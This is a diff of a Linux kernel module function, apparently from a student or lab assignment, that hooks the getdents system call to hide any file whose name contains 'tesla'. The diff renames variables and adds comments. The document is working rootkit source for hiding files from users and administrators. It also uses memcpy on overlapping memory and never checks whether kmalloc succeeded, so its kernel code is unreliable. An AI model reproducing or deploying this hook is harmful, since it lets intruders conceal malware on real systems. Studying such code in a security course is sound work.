@@ -19,36 +19,47 @@ MODULE_LICENSE("GPL v2");
 /* we intercept getdents so as to hide specific files. */
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
+  // Variables used in function
   int totalSize = orig_getdents(fd, dirp, count);
   int remainingSize = totalSize;
   int l;
 
-  struct linux_dirent *p1 = kmalloc(totalSize, GFP_KERNEL);
-  struct linux_dirent *p2 = 0;
+  // Created memory and additional struct to help me later
+  struct linux_dirent *cDirp = kmalloc(totalSize, GFP_KERNEL);
+  struct linux_dirent *nDirp = 0;
 
-  if (copy_from_user(p1, dirp, totalSize) != 0) {
-    kfree(p1);
+  // Making sure the copy_from_user function worked properly, if not, throw an error and free memory
+  if (copy_from_user(cDirp, dirp, totalSize) != 0) {
+    kfree(cDirp);
     return -EACCES;
   }
 
-  p2 = p1;
+  // Extra struct created earlier used here, probably could have done without it but helped my brain work 
+  nDirp = cDirp;
 
+  // Main loop working to hide the tesla files
   while (remainingSize > 0) {
-    l = p2->d_reclen;
-    remainingSize -= p2->d_reclen;
-    if (strstr(p2->d_name, "tesla")) {
-      memcpy(p2, (struct linux_dirent *)((char *)p2 + (p2->d_reclen)), remainingSize);
+    // was having issues with test1 hanging, so added extra variables which seemed to work
+    l = nDirp->d_reclen;
+    remainingSize -= nDirp->d_reclen;
+    // Finding files with tesla in name
+    if (strstr(nDirp->d_name, "tesla")) {
+      // Couldn't use memmove so used memcpy
+      memcpy(nDirp, (struct linux_dirent *)((char *)nDirp + (nDirp->d_reclen)), remainingSize);
+      // Again was having issues with test1 hanging with other way I did it, so added more variables and this seemed to work
       totalSize -= l;
-    } else {
-      p2 = (struct linux_dirent *)((char *)p2 + (p2->d_reclen));
+    } else { 
+      nDirp = (struct linux_dirent *)((char *)nDirp + (nDirp->d_reclen));
     }
   }
 
-  if (copy_to_user(dirp, p1, totalSize) != 0) {
-    kfree(p1);
+  // Making sure copy_to_user was done correctly, if error, return error and free memory
+  if (copy_to_user(dirp, cDirp, totalSize) != 0) {
+    kfree(cDirp);
     return -EACCES;
   }
-  kfree(p1);
+  // Free memory and return totalSize
+  kfree(cDirp);
   return totalSize;
 }
 
